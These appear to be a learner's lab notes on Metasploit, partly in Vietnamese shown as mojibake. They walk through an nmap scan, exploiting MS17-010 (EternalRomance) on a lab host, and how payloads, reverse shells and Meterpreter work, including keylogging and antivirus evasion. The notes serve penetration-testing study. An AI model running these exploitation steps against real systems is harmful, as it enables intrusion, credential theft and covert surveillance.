metasploit 


/usr/share/metasploit-framewok

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

T√¨m hi·ªÉu s∆° qua v·ªÅ metasploit 

Metasploit Pro : commercial use , paid Subscription, Enterprise 

Metasploit Framework : Open source, Community Driven, Free 

C√≥ bao nhi√™u module 
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/modules
    auxiliary  encoders  evasion  exploits  nops  payloads  post

Plguin ? 
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
    aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
    alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
    auto_add_route.rb  lab.rb         request.rb           thread.rb
    beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
    db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
    db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
    event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
    ffautoregen.rb     nexpose.rb     socket_logger.rb

Plugin trong Metasploit l√† c√°c ti·ªán √≠ch m·ªü r·ªông b·∫±ng Ruby, n·∫°p b·∫±ng l·ªánh load, gi√∫p b·ªï sung ch·ª©c nƒÉng v√† t·ª± ƒë·ªông h√≥a trong msfconsole.
  V√≠ d·ª•:
    nmap ‚Üí ch·∫°y Nmap tr·ª±c ti·∫øp trong Metasploit, import k·∫øt qu·∫£.
    session_tagger ‚Üí t·ª± ƒë·ªông g·∫Øn nh√£n cho session.
    event_tagger ‚Üí log & g·∫Øn th·∫ª s·ª± ki·ªán.
    log ‚Üí ghi log ho·∫°t ƒë·ªông.
    üëâ Hi·ªÉu ƒë∆°n gi·∫£n: plugin = ‚Äúadd-on‚Äù gi√∫p msfconsole m·∫°nh v√† ti·ªán h∆°n.

Script
  Ch·ª©c nƒÉng Meterpreter v√† c√°c script h·ªØu √≠ch kh√°c.
    naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
    meterpreter  ps  resource  shell

Tools
Command-line utilities that can be called directly from the msfconsole menu.
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
    context  docs     hardware  modules   payloads
    dev      exploit  memdump   password  recon



Make sure you are using the latest version
  naruto3co@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

The first steps √≠ to gather information about the target: what it is, which technologies and versions are being used, and whether they have vulnerability . -> we need Enumeration 
MSF engagement structure 

Engagement Structure
‚îÇ
‚îú‚îÄ‚îÄ Enumeration
‚îÇ   ‚îú‚îÄ‚îÄ Service Validation
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ Passive Scanning
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ OSINT
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ Interacting with services legitimately
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Whois / DNS records
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Active Scanning
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ nMap / Nessus / NexPose scans
‚îÇ   ‚îÇ       ‚îú‚îÄ‚îÄ Web service identification tools
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ Built-with identification tools
‚îÇ   ‚îî‚îÄ‚îÄ Vulnerability Research
‚îÇ       ‚îú‚îÄ‚îÄ VulnDB (GUI)
‚îÇ       ‚îú‚îÄ‚îÄ Rapid7 (GUI)
‚îÇ       ‚îú‚îÄ‚îÄ SearchSploit (CLI)
‚îÇ       ‚îî‚îÄ‚îÄ Google Dorking (GUI)
‚îÇ
‚îú‚îÄ‚îÄ Preparation
‚îÇ   ‚îú‚îÄ‚îÄ Code Auditing
‚îÇ   ‚îú‚îÄ‚îÄ Dependency Check
‚îÇ   ‚îî‚îÄ‚îÄ Importing Custom Modules
‚îÇ
‚îú‚îÄ‚îÄ Exploitation
‚îÇ   ‚îú‚îÄ‚îÄ Run Module Locally
‚îÇ   ‚îú‚îÄ‚îÄ Set Parameters
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ Options (> show options)
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ URI
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ PROXIES
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ RHOST / RPORT
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ USERNAMES / PASSWORDS
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ DICTIONARIES
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ SESSION
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ Payloads (> show payloads)
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ METERPRETER
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ SHELL BINDS
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ REVERSE SHELLS
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ EXE
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ LINUX
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ WINDOWS
‚îÇ   ‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ MACOSX
‚îÇ   ‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ OTHERS
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ Targets (> show targets)
‚îÇ   ‚îÇ       ‚îî‚îÄ‚îÄ Set target [OS]
‚îÇ   ‚îî‚îÄ‚îÄ Run
‚îÇ
‚îú‚îÄ‚îÄ Privilege Escalation
‚îÇ   ‚îú‚îÄ‚îÄ Vulnerability Research
‚îÇ   ‚îú‚îÄ‚îÄ Credential Gathering
‚îÇ   ‚îî‚îÄ‚îÄ Token Impersonation
‚îÇ
‚îî‚îÄ‚îÄ Post-Exploitation
    ‚îú‚îÄ‚îÄ Pivoting to Other Systems
    ‚îú‚îÄ‚îÄ Credential Gathering
    ‚îú‚îÄ‚îÄ Data Exfiltration
    ‚îî‚îÄ‚îÄ Cleanup

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Once we are in the msfconsole, we can select modules available Metasploit. Each of them is structured into folders, which will look like this 

Syntax
  <No.> <type>/<os>/<service>/<name>
  794   exploit/windows/ftp/scriptftp_list

How many type of "type" 
  Auxiliary: Qu√©t (scanning), fuzzing, sniffing v√† c√°c kh·∫£ nƒÉng qu·∫£n tr·ªã. Cung c·∫•p h·ªó tr·ª£ v√† ch·ª©c nƒÉng b·ªï sung.
  Encoders: ƒê·∫£m b·∫£o payload ƒë∆∞·ª£c gi·ªØ nguy√™n v·∫πn khi t·ªõi ƒë√≠ch.
  Exploits: ƒê∆∞·ª£c ƒë·ªãnh nghƒ©a l√† c√°c module khai th√°c l·ªó h·ªïng, cho ph√©p tri·ªÉn khai payload.
  NOPs: (No Operation code) Gi·ªØ cho k√≠ch th∆∞·ªõc payload nh·∫•t qu√°n gi·ªØa c√°c l·∫ßn khai th√°c.
  Payloads: ƒêo·∫°n m√£ ch·∫°y t·ª´ xa v√† g·ªçi ng∆∞·ª£c v·ªÅ m√°y t·∫•n c√¥ng ƒë·ªÉ thi·∫øt l·∫≠p k·∫øt n·ªëi (ho·∫∑c shell).
  Plugins: C√°c script b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c t√≠ch h·ª£p trong qu√° tr√¨nh ki·ªÉm th·ª≠ v·ªõi msfconsole v√† c√πng t·ªìn t·∫°i.
  Post: Nhi·ªÅu module h·ªó tr·ª£ thu th·∫≠p th√¥ng tin, m·ªü r·ªông t·∫•n c√¥ng (pivot), v√† c√°c ho·∫°t ƒë·ªông h·∫≠u khai th√°c kh√°c.

H·ªá ƒëi·ªÅu h√†nh
  Th·∫ª H·ªá ƒëi·ªÅu h√†nh ch·ªâ ƒë·ªãnh h·ªá ƒëi·ªÅu h√†nh v√† ki·∫øn tr√∫c m√† m√¥-ƒëun ƒë∆∞·ª£c t·∫°o ra. T·∫•t nhi√™n, c√°c h·ªá ƒëi·ªÅu h√†nh kh√°c nhau y√™u c·∫ßu m√£ kh√°c nhau ƒë·ªÉ ch·∫°y ƒë·ªÉ c√≥ ƒë∆∞·ª£c k·∫øt qu·∫£ mong mu·ªën.

D·ªãch v·ª•
  Th·∫ª D·ªãch v·ª• ƒë·ªÅ c·∫≠p ƒë·∫øn d·ªãch v·ª• d·ªÖ b·ªã t·∫•n c√¥ng ƒëang ch·∫°y tr√™n m√°y m·ª•c ti√™u. ƒê·ªëi v·ªõi m·ªôt s·ªë m√¥-ƒëun, ch·∫≥ng h·∫°n nh∆∞ m√¥-ƒëun ph·ª• tr·ª£ ho·∫∑c m√¥-ƒëun sau, th·∫ª n√†y c√≥ th·ªÉ ƒë·ªÅ c·∫≠p ƒë·∫øn m·ªôt ho·∫°t ƒë·ªông chung h∆°n nh∆∞ thu th·∫≠p, v√≠ d·ª• nh∆∞ thu th·∫≠p th√¥ng tin ƒëƒÉng nh·∫≠p.

T√™n
  Cu·ªëi c√πng, th·∫ª T√™n gi·∫£i th√≠ch h√†nh ƒë·ªông th·ª±c t·∫ø c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c hi·ªán b·∫±ng m√¥-ƒëun n√†y ƒë∆∞·ª£c t·∫°o cho m·ªôt m·ª•c ƒë√≠ch c·ª• th·ªÉ.



Searching for Modules
  msf6 > search eternalromance
  Matching Modules
  ================
  
     #  Name                                  Disclosure Date  Rank    Check  Description
     -  ----                                  ---------------  ----    -----  -----------
     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

  msf6 > search eternalromance type:exploit
  Matching Modules
  ================
     #  Name                                  Disclosure Date  Rank    Check  Description
     -  ----                                  ---------------  ----    -----  -----------
     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


Ch√∫ng ta c≈©ng c√≥ th·ªÉ l√†m cho t√¨m ki·∫øm tr·ªü n√™n t·ªïng qu√°t h∆°n m·ªôt ch√∫t v√† thu h·∫πp n√≥ th√†nh m·ªôt danh m·ª•c d·ªãch v·ª•. V√≠ d·ª•, ƒë·ªëi v·ªõi CVE, ch√∫ng ta c√≥ th·ªÉ ch·ªâ ƒë·ªãnh nƒÉm (cve:<year>), n·ªÅn t·∫£ng Windows (platform:<os>), lo·∫°i m√¥-ƒëun ch√∫ng ta mu·ªën t√¨m (type:<auxiliary/exploit/post>), th·ª© h·∫°ng ƒë·ªô tin c·∫≠y (rank:<rank>) v√† t√™n t√¨m ki·∫øm (<pattern>). ƒêi·ªÅu n√†y s·∫Ω thu h·∫πp k·∫øt qu·∫£ t√¨m ki·∫øm xu·ªëng ch·ªâ c√≤n nh·ªØng k·∫øt qu·∫£ kh·ªõp v·ªõi t·∫•t c·∫£ c√°c y·∫øu t·ªë tr√™n.

MSF - Specific Search
  msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
  Matching Modules
  ================
  
     #  Name                                            Disclosure Date  Rank       Check  Description
     -  ----                                            ---------------  ----       -----  -----------
     0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
     1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
     2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE


Module Selection
To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.
  naruto3co@htb[/htb]$ nmap -sV 10.10.10.40
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
    Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Nmap scan report for 10.10.10.40
    Host is up (0.051s latency).
    Not shown: 991 closed ports
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds

L∆∞u √Ω ·ªü ƒë√¢y l√† : Port 445 m·ªü, ƒë√¢y l√† SMB service, th∆∞·ªùng li√™n quan ƒë·∫øn c√°c l·ªó h·ªïng n·ªïi ti·∫øng nh∆∞ MS17-010 (EternalBlue, EternalRomance, EternalChampion, ‚Ä¶). => t√¨m c√°c l·ªó h·ªïng li√™n quan tr√™n msfconsole 

  msf6 > search ms17_010
  Matching Modules
  ================
     #  Name                                      Disclosure Date  Rank     Check  Description
     -  ----                                      ---------------  ----     -----  -----------
     0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
     3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

Ti·∫øp theo, ch·ªçn module ph√π h·ª£p. th·∫•y r·∫±ng nmap nh·∫≠n ƒë·ªãnh ƒë√¢y l√† windows 7 ƒë·∫øn 10 

S·ª≠ d·ª•ng module
  msf6 > use 0
  msf6 exploit(windows/smb/ms17_010_psexec) > options
  Module options (exploit/windows/smb/ms17_010_psexec): 
     Name                  Current Setting                          Required  Description
     ----                  ---------------                          --------  -----------
     DBGTRACE              false                                    yes       Show extra debug trace info
     LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
     NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
     NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                           rdlists/named_pipes.txt
     RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                              /wiki/Using-Metasploit
     RPORT                 445                                      yes       The Target port (TCP)
     SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
     SERVICE_DISPLAY_NAME                                           no        The service display name
     SERVICE_NAME                                                   no        The service name
     SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                              rmal read/write folder share
     SMBDomain             .                                        no        The Windows domain to use for authentication
     SMBPass                                                        no        The password for the specified username
     SMBUser                                                        no        The username to authenticate as
  Payload options (windows/meterpreter/reverse_tcp):
     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
     LHOST                      yes       The listen address (an interface may be specified)
     LPORT     4444             yes       The listen port
  Exploit target:
     Id  Name
     --  ----
     0   Automatic

Ta th·∫•y th·∫ª No. r·∫•t helpful , ch·ªâ c·∫ßn nh·∫≠p s·ªë c·ªßa n√≥ thay v√¨ nh·∫≠p t√™n c·∫£ module 
Ch·ªçn module xong r·ªìi th√¨ ta c√≥ th·ªÉ xem th√¥ng tin c·ªßa module ƒë√≥
  msf6 exploit(windows/smb/ms17_010_psexec) > info
         Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
       Module: exploit/windows/smb/ms17_010_psexec
     Platform: Windows
         Arch: x86, x64
   Privileged: No
      License: Metasploit Framework License (BSD)
         Rank: Normal
    Disclosed: 2017-03-14
  Provided by:
    sleepya
    zerosum0x0
    Shadow Brokers
    Equation Group
  Available targets:
    Id  Name
    --  ----
    0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
  Check supported:
    Yes
  Basic options:
    Name                  Current Setting                          Required  Description
    ----                  ---------------                          --------  -----------
    DBGTRACE              false                                    yes       Show extra debug trace info
    LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
    NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
    NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                          rdlists/named_pipes.txt
    RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                             wiki/Using-Metasploit
    RPORT                 445                                      yes       The Target port (TCP)
    SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                                           no        The service display name
    SERVICE_NAME                                                   no        The service name
    SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                             mal read/write folder share
    SMBDomain             .                                        no        The Windows domain to use for authentication
    SMBPass                                                        no        The password for the specified username
    SMBUser                                                        no        The username to authenticate as
  Payload information:
    Space: 3072
  Description:
    This module will exploit SMB with vulnerabilities in MS17-010 to 
    achieve a write-what-where primitive. This will then be used to 
    overwrite the connection session information with as an 
    Administrator session. From there, the normal psexec payload code 
    execution is done. Exploits a type confusion between Transaction and 
    WriteAndX requests and a race condition in Transaction requests, as 
    seen in the EternalRomance, EternalChampion, and EternalSynergy 
    exploits. This exploit chain is more reliable than the EternalBlue 
    exploit, but requires a named pipe.
  References:
    https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
    https://nvd.nist.gov/vuln/detail/CVE-2017-0143
    https://nvd.nist.gov/vuln/detail/CVE-2017-0146
    https://nvd.nist.gov/vuln/detail/CVE-2017-0147
    https://github.com/worawit/MS17-010
    https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
    https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
  Also known as:
    ETERNALSYNERGY
    ETERNALROMANCE
    ETERNALCHAMPION
    ETERNALBLUE

Ch·ªó n√†y quan t√¢m m·ªói basic Option nh√© ae. ch·ªó n√†o required l√† YES th√¨ ae c·∫ßn ƒëi·ªÅn nh√© 

Modules
  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
    RHOSTS => 10.10.10.40

  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
  RHOSTS => 10.10.10.40

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

  msf6 exploit(windows/smb/ms17_010_psexec) > run

T√¥i th∆∞·ªùng d√πng msf6 >check ƒë·ªÉ ki·ªÉm tra tr∆∞·ªõc khi >run ƒë√≥ 
  exploit(windows/smb/ms17_010_psexec) > check


D√πng show target khi n√†o 
  msf6 > use exploit/windows/smb/ms17_010_psexec
  msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
  
  Exploit targets: 
     Id  Name
     --  ----
     0   Automatic
     1   IE 7 on Windows XP SP3
     2   IE 8 on Windows XP SP3
     3   IE 7 on Windows Vista
     4   IE 8 on Windows Vista
     5   IE 8 on Windows 7
     6   IE 9 on Windows 7

show targets ch√®n ngay sau khi ch·ªçn exploit, ƒë·ªÉ x√°c ƒë·ªãnh OS n√†o s·∫Ω khai th√°c.
T·∫°i sao ph·∫£i ch·ªçn target trong khi msfconsole c√≥ kh·∫£ nƒÉng t·ª± ƒë·ªông t√¨m ƒë∆∞·ª£c. Gi·∫£m kh√° nƒÉng crash, gi·∫£m th·ªùi gian, ph·∫°m vi s·ª≠ d·ª•ng metasploit 

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Payload
There are three different types of payload modules in the MSF : Single, Stagers and Stages 

Singles (Payload ƒë∆°n / Inline payload)
  Ch·ª©a c·∫£ exploit + shellcode trong c√πng m·ªôt g√≥i.
  ∆Øu ƒëi·ªÉm: ·ªïn ƒë·ªãnh h∆°n, ch·ªâ c·∫ßn g·ª≠i m·ªôt l·∫ßn l√† ch·∫°y ngay (self-contained).
  Nh∆∞·ª£c ƒëi·ªÉm: k√≠ch th∆∞·ªõc l·ªõn, m·ªôt s·ªë exploit kh√¥ng ch·ªãu ƒë∆∞·ª£c.
  V√≠ d·ª•: t·∫°o user m·ªõi, kh·ªüi ch·∫°y process.
Stagers (Tr√¨nh kh·ªüi t·∫°o)
  Nhi·ªám v·ª•: thi·∫øt l·∫≠p k·∫øt n·ªëi gi·ªØa attacker ‚Üî victim.
  Nh·ªè g·ªçn, ƒë√°ng tin c·∫≠y.
  Sau khi ch·∫°y, n√≥ m·ªü ƒë∆∞·ªùng cho Stages t·∫£i xu·ªëng.
Stages (Th√†nh ph·∫ßn t·∫£i xu·ªëng)
  L√† ph·∫ßn m·ªü r·ªông ƒë∆∞·ª£c t·∫£i v·ªÅ b·ªüi Stager.
  Kh√¥ng gi·ªõi h·∫°n k√≠ch th∆∞·ªõc, cung c·∫•p t√≠nh nƒÉng n√¢ng cao nh∆∞ Meterpreter, VNC Injection...
  Qu√° tr√¨nh: Stager t·∫£i ‚Äúmiddle stager‚Äù ‚Üí middle stager t·∫£i to√†n b·ªô Stage.

V√≠ d·ª• ph√¢n bi·ªát
  windows/shell_bind_tcp ‚Üí payload ƒë∆°n (single).
  windows/shell/bind_tcp ‚Üí g·ªìm stager (bind_tcp) + stage (shell).

üëâ T√≥m l·∫°i:
  Single = t·∫•t c·∫£ trong m·ªôt, ch·∫°y ngay.
  Stager = m·ªü k√™nh k·∫øt n·ªëi.
  Stage = ph·∫ßn t·∫£i v·ªÅ v·ªõi t√≠nh nƒÉng n√¢ng cao.

Staged Payload 

Staged Payloads l√† g√¨
  L√† lo·∫°i payload ƒë∆∞·ª£c chia nh·ªè th√†nh nhi·ªÅu ph·∫ßn (stages), m·ªói ph·∫ßn ƒë·∫£m nhi·ªám m·ªôt nhi·ªám v·ª• ri√™ng, sau ƒë√≥ k·∫øt h·ª£p chu·ªói l·∫°i th√†nh to√†n b·ªô cu·ªôc t·∫•n c√¥ng.
M·ª•c ti√™u: cu·ªëi c√πng v·∫´n l√† c√≥ remote access (shell) v√†o m√°y n·∫°n nh√¢n.
∆Øu ƒëi·ªÉm
  Nh·ªè g·ªçn, k√≠n ƒë√°o ‚Üí gi√∫p n√© Antivirus (AV) / Intrusion Prevention System (IPS).
  D·ªÖ truy·ªÅn qua m·∫°ng v√¨ kh√¥ng ph·∫£i g·ª≠i 1 payload qu√° l·ªõn ngay t·ª´ ƒë·∫ßu.
Stage0 (giai ƒëo·∫°n ƒë·∫ßu)
  L√† ƒëo·∫°n shellcode nh·ªè g·ª≠i ƒë·∫ßu ti√™n ƒë·∫øn d·ªãch v·ª• d·ªÖ b·ªã t·∫•n c√¥ng.
  Nhi·ªám v·ª• duy nh·∫•t: t·∫°o k·∫øt n·ªëi ng∆∞·ª£c t·ª´ m√°y n·∫°n nh√¢n v·ªÅ attacker.
  ƒê√¢y ch√≠nh l√† reverse connection.
V√≠ d·ª• trong Metasploit
  Payload th∆∞·ªùng th·∫•y:
    reverse_tcp
    reverse_https
    bind_tcp
C√≥ th·ªÉ xem b·∫±ng l·ªánh: show payloads

T√≥m l·∫°i: Staged Payload = payload theo t·ª´ng giai ƒëo·∫°n. G·ª≠i tr∆∞·ªõc 1 shellcode nh·ªè ƒë·ªÉ m·ªü k·∫øt n·ªëi (Stage0), r·ªìi l·∫ßn l∆∞·ª£t t·∫£i th√™m ph·∫ßn l·ªõn (Stage1, Stage2‚Ä¶) ‚Üí v·ª´a hi·ªáu qu·∫£, v·ª´a kh√≥ b·ªã AV ph√°t hi·ªán.

Reverse Connections (K·∫øt n·ªëi ng∆∞·ª£c)
  ∆Øu ƒëi·ªÉm: khi n·∫°n nh√¢n ch·ªß ƒë·ªông k·∫øt n·ªëi ra ngo√†i (v·ªÅ ph√≠a attacker) th√¨ d·ªÖ qua m·∫∑t h·ªá th·ªëng ph√≤ng th·ªß, v√¨ traffic th∆∞·ªùng ƒë∆∞·ª£c tin t∆∞·ªüng n·∫øu ƒëi t·ª´ b√™n trong (n·ªôi b·ªô) ra ngo√†i ‚Üí g·ªçi l√† security trust zone.
  Nh∆∞·ª£c ƒëi·ªÉm: kh√¥ng ph·∫£i l√∫c n√†o c≈©ng qua m·∫∑t ƒë∆∞·ª£c, v·∫´n c√≥ th·ªÉ b·ªã thi·∫øt b·ªã an ninh ph√°t hi·ªán. Attacker c·∫ßn c·∫©n tr·ªçng.
Stage0 v√† Stage1
  Stage0: ƒëo·∫°n code nh·ªè, nhi·ªám v·ª•:
  T·∫°o k·∫øt n·ªëi ·ªïn ƒë·ªãnh gi·ªØa attacker ‚Üî victim.
  Chu·∫©n b·ªã s·∫µn ƒë·ªÉ t·∫£i th√™m payload kh√°c v√†o b·ªô nh·ªõ.
  Stage1: payload l·ªõn h∆°n, ƒë∆∞·ª£c g·ª≠i sau khi Stage0 th√†nh c√¥ng, th∆∞·ªùng cung c·∫•p shell access cho attacker.
Meterpreter Payload
  L√† payload ƒë·∫∑c bi·ªát trong Metasploit, d·ª±a tr√™n DLL injection.
  ƒê·∫∑c t√≠nh:
    Ch·∫°y ho√†n to√†n trong RAM (kh√¥ng ghi xu·ªëng ·ªï c·ª©ng).
    Kh√≥ ph√°t hi·ªán b·∫±ng k·ªπ thu·∫≠t forensics truy·ªÅn th·ªëng.
    Gi·ªØ k·∫øt n·ªëi ·ªïn ƒë·ªãnh, dai d·∫≥ng, k·ªÉ c·∫£ khi h·ªá th·ªëng thay ƒë·ªïi ho·∫∑c reboot.
  Sau khi ch·∫°y, t·∫°o ra m·ªôt Meterpreter session (giao di·ªán ri√™ng).
  Ch·ª©c nƒÉng n·ªïi b·∫≠t:
    Keylogging (ghi l·∫°i ph√≠m b·∫•m).
    Dump password hashes.
    Ghi √¢m qua micro.
    Ch·ª•p m√†n h√¨nh.
    Gi·∫£ m·∫°o token ti·∫øn tr√¨nh.
    T·∫£i / g·ª° plugin linh ho·∫°t.
  üëâ T√≥m l·∫°i:
  Reverse connection gi√∫p attacker d·ªÖ l·ªçt qua firewall.
  Stage0 ‚Üí Stage1 l√† c∆° ch·∫ø staged payload ƒëi·ªÉn h√¨nh: nh·ªè g·ªçn ban ƒë·∫ßu, r·ªìi m·ªü r·ªông.
  Meterpreter l√† payload ‚Äúx·ªãn‚Äù nh·∫•t c·ªßa Metasploit: linh ho·∫°t, stealth, ch·∫°y trong RAM, nhi·ªÅu c√¥ng c·ª• t·∫•n c√¥ng t√≠ch h·ª£p.

| Ti√™u ch√≠            | **Payload th∆∞·ªùng (Shell Payloads)**                                             | **Meterpreter Payload**                                                                 |
| ------------------- | ------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| **C√°ch ho·∫°t ƒë·ªông**  | Th∆∞·ªùng ch·ªâ m·ªü **command shell** (cmd, sh) c∆° b·∫£n sau khi khai th√°c th√†nh c√¥ng.  | S·ª≠ d·ª•ng **DLL injection**, ch·∫°y tr·ª±c ti·∫øp trong **RAM**, kh√¥ng ghi xu·ªëng ·ªï c·ª©ng.        |
| **Ch·ª©c nƒÉng**       | H·∫°n ch·∫ø: ch·ªâ g√µ l·ªánh c∆° b·∫£n tr√™n m√°y n·∫°n nh√¢n.                                  | R·∫•t phong ph√∫: keylogger, ch·ª•p m√†n h√¨nh, dump hash, micro tapping, token impersonation‚Ä¶ |
| **T√≠nh ·∫©n m√¨nh**    | D·ªÖ b·ªã ph√°t hi·ªán b·ªüi AV/IPS ho·∫∑c forensic tools v√¨ shellcode th∆∞·ªùng ghi d·∫•u v·∫øt. | **Kh√≥ ph√°t hi·ªán**: kh√¥ng ƒë·ªÉ l·∫°i file tr√™n ·ªï c·ª©ng, t·ªìn t·∫°i trong b·ªô nh·ªõ.                 |
| **·ªîn ƒë·ªãnh k·∫øt n·ªëi** | D·ªÖ m·∫•t k·∫øt n·ªëi n·∫øu m·∫°ng ch·∫≠p ch·ªùn ho·∫∑c victim reboot.                           | K·∫øt n·ªëi ·ªïn ƒë·ªãnh, c√≥ th·ªÉ t·ªìn t·∫°i qua reboot, √≠t b·ªã gi√°n ƒëo·∫°n.                            |
| **M·ªü r·ªông**         | Kh√¥ng h·ªó tr·ª£ plugin, c·ªë ƒë·ªãnh ch·ª©c nƒÉng.                                         | C√≥ th·ªÉ t·∫£i/g·ª° **plugin** ho·∫∑c script ƒë·ªông ‚Üí linh ho·∫°t.                                  |
| **K·ªãch b·∫£n d√πng**   | Ph√π h·ª£p khi ch·ªâ c·∫ßn **quy·ªÅn truy c·∫≠p nhanh**, √≠t thao t√°c.                      | Ph√π h·ª£p khi mu·ªën **ki·ªÉm so√°t l√¢u d√†i** v√† th·ª±c hi·ªán **post-exploitation n√¢ng cao**.     |

NOTE 
  msfconsole ch·ªâ l√† giao di·ªán ch√≠nh c·ªßa Metasploit (CLI), b·∫°n c√≥ th·ªÉ ch·ªçn b·∫•t k·ª≥ payload n√†o trong ƒë√≥:
    Payload th∆∞·ªùng (shell)
